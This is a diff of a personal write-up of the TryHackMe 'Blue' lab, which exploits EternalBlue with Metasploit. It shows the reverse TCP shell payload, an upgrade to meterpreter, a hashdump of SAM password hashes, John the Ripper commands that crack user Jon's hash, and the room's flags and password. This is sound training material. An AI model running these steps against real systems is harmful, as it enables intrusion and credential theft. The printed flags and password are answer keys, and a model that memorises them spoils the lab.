@@ -1,8 +1,8 @@
 # Blue
 
-Author: Corbett Stephens || July 14, 2021
+Author: Corbett Stephens || July 14, 2021 || Contact: corbettdstephens@gmail.com
 
-Blue is a TryHackMe room that explores the "Eternal Blue" exploit from older versions of windows. 
+Blue is a TryHackMe room that explores the "Eternal Blue" exploit from older versions of Windows. 
 
 The room can be found [here](https://tryhackme.com/room/blue).
 
@@ -108,69 +108,82 @@ Each module has required fields that have to be set before an exploit can be ran
 
 ![](./pictures/module_options.png)
 
-I need to set the RHOSTS which is the target host that we are attacking. We do this by entering:
+I need to set the RHOSTS which is the target host that we are attacking. I do this by entering:
 
-"set RHOSTS 10.10.48.230"
+`set RHOSTS 10.10.48.230`
 
-The playload we want to use is the "windows/x64/shell/reverse_tcp"
+In a normal TCP/IP connection, the client will issue a request to the server. The server will then respond the client. The client will respond again a connection will be established. If the server is using a firewall then this normal type of connection will be blocked. When reverse tcp is used, the server initiates a connection to the client (hense reverse). This allows for the client to reply to the server request and establish a connection. The playload that needs to be used is **windows/x64/shell/reverse_tcp**. 
 
-We can set this as the payload by doing "set payload windows/x64/shell/reverse_tcp"
+The payload is set by doing `set payload windows/x64/shell/reverse_tcp`.
 
-To run the exploit we can simply enter "exploit"
+To run the exploit enter `exploit` or `run`.
 
-If the exploit is successful then a DOS (disk operationg system) will appear. 
+If the exploit is successful then a DOS (disk operationg system) shell will appear as shown below.
 
-If we run "whoami" it tells us that we are "nt authority\system"
+![](./pictures/dos.png)
 
-We want upgrade this shell to a meterprerter shell. Background the current shell by doing "CTRL + Z". I used this article to help upgrade my shell https://www.hackingarticles.in/command-shell-to-meterpreter/ 
+If I run "whoami" it says that I am "nt authority\system" which has very sensative user privlages.
 
+I want upgrade this shell to a meterprerter shell as there are a lot of benefits to using a meterpreter shell. I used this [article](https://www.hackingarticles.in/command-shell-to-meterpreter/) to help me figure out how to upgrade my shell. 
 
-I used "sessions -u 1"
+To upgrade: `sessions -u 1`
 
-**PICTURE**
+![](./pictures/shell_2_meterpreter.png)
 
 Now that we have our meterpreter shell, we can run "getsystem" to ensure that we are indeed "nt authority\system".
 
-Just because our user is system, doesnt mean that the process is. We will want to switch our process to one that is running "nt authority\system". This is shown below.
+Just because our user is system, doesnt mean that the process is. We will want to switch our process to one that is running "nt authority\system". 
 
-**PICTURE**
 
-Meterpreter has a handy command to dump the SAM database. SAM is the system accounts manager. The SAM database stores passwords locally. By using the "hashdump" command we can get this data and try to make something useful with it.
+Meterpreter has a handy command to dump the SAM database. SAM is the system accounts manager. The SAM database stores passwords locally. By using the `hashdump` command I can get this data and try to make something useful with it.
 
-We get the following data:
+I get the following data:
 
+<pre>
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+</pre>
 
-In this case, we are interested in Jon. I created a file named "jon_hash.txt" and put the hash values into the file. I decided that the long string of data was two 32 character hash strings and put them on seperate lines. To crack this hash, I used hashcat. I ran the following command. 
+In this case, I am interested in Jon. I created a file named "jon.hash" and put the hash values into the file. To crack this hash, I used John the Ripper which comes default on Kali Linux. I ran the following commands:
 
-hashcat -m 0 -a 0 jon_hash.txt ./rockyou.txt --show
+`john jon.hash --format=NT --wordlist=./rockyou.txt`
+`john jon.hash --format=NT --show`
 
-"-m 0" straight mode
-"-a 0" MD5
-"jon_hash.txt" hash file
-"./rockyou.txt" dictionary
-"--show" show results
+- "jon.hash" the file reading from
+- "--format=NT" NT is the format of the hash that I got from the hash dump. It is common on Windows systems. I had to figure this out by researching the type of hash.
+- "wordlist=./rockyou.txt" This uses a large file of common passwords to try to find the user password for Jon.
+- "--show" Show the output.
+<pre>
+Jon:**alqfna22**:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+</pre>
 
-john jon.hash --format=NT --wordlist=./rockyou.txt
-john jon.hash --format=NT --show
-Jon:alqfna22:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+Username: Jon
+Password: **alqfna22**
 
-password:alqfna22
+---
 
-#Task 5: Find Flags!
+## Find Flags
+This part is just for answer the questions on TryHackMe.
 
-The first flag can be found by 'cd \' and then type 'flag1.txt'
+The first flag can be found in the at the root.
 
-Flag 1: flag{access_the_machine}
+Flag 1: `flag{access_the_machine}`
 
 The second flag is found in config
 C:\Windows\system32\config
-"cat flag2.txt"
 
-Flag 2: flag{sam_database_elevated_access}
+Flag 2: `flag{sam_database_elevated_access}`
 
 Flag 3 can be found in C:\Users\Jon\Documents
 
-Flag 3: flag{admin_documents_can_be_valuable}
+Flag 3: `flag{admin_documents_can_be_valuable}`
+
+---
+
+# Conclusion
+
+This room allowed me to fully execute the famous EternalBlue exploit from top to bottom. In the process, I strengethed my skills in nmap, Metasploit, and John the Ripper. I started my reconnaissance with nmap, developed my attack vector with Metasploit, and derived user credentials with John the Ripper.
+
+Thank you,
+Corbett
